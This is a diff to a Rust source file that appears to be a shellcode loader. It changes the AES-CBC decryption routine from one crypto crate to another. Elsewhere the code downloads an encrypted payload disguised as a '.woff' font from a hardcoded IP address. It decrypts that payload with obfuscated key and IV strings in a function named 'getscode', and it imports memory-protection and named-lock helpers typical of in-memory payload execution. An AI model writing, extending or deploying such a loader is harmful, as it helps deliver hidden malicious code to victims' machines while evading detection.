@@ -3,11 +3,11 @@ use std::process::exit;
 //common use
 use bytes::Bytes;
 use region::{Protection, Allocation};
-use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
+
 use named_lock::NamedLock;
 use named_lock::Result;
-
-type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
+use crypto::{ symmetriccipher, buffer, aes, blockmodes };
+use crypto::buffer::{ ReadBuffer, WriteBuffer, BufferResult };
 
 const URL: &str = "http://192.168.68.73:8080/test.woff";
 
@@ -16,7 +16,7 @@ const AESIV: &str  = "lbzPx4uGUpAx7Wap";
 
 const LOCKNAME: &str = "RLOCK";
 
-fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
+fn decrypt(encrypted_data: &[u8]) -> Result<Vec<u8>, symmetriccipher::SymmetricCipherError> {
     let mut key = [0x42; 16];
     let mut iv = [0x24; 16];
     for (i, b) in obfstr::obfstr!(AESKEY).as_bytes().iter().enumerate() {
@@ -25,11 +25,26 @@ fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
     for (i, b) in obfstr::obfstr!(AESIV).as_bytes().iter().enumerate() {
         iv[i] = *b;
     }
-    let mut buf: Vec<u8> = Vec::with_capacity(size);
-    let _pt = Aes256CbcDec::new(&key.into(), &iv.into())
-        .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buf)
-        .unwrap();
-    return buf;
+    let mut decryptor = aes::cbc_decryptor(
+        aes::KeySize::KeySize128,
+        &key,
+        &iv,
+        blockmodes::PkcsPadding);
+    // copied from rust-crypto sample
+    let mut final_result = Vec::<u8>::new();
+    let mut read_buffer = buffer::RefReadBuffer::new(encrypted_data);
+    let mut buffer = [0; 4096];
+    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);
+
+    loop {
+        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
+        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
+        match result {
+            BufferResult::BufferUnderflow => break,
+            BufferResult::BufferOverflow => { }
+        }
+    }
+    Ok(final_result)
 }
 
 fn getscode(url: &str) -> Bytes {
@@ -48,7 +63,11 @@ fn getscode(url: &str) -> Bytes {
     };
     // note, skip the first 16 bytes since they are the IV, might want to remove the IV from being in code and 
     // add it to the decypt function
-    let pt = decrypt(&rbytes[16..], rbytes.len());
+    let pt = match decrypt(&rbytes[16..]) {
+        Ok(p) => p,
+        Err(e) => panic!("Error: {:?}", e)
+    };
+
     let ptb = Bytes::from(pt);
     return ptb;
 }
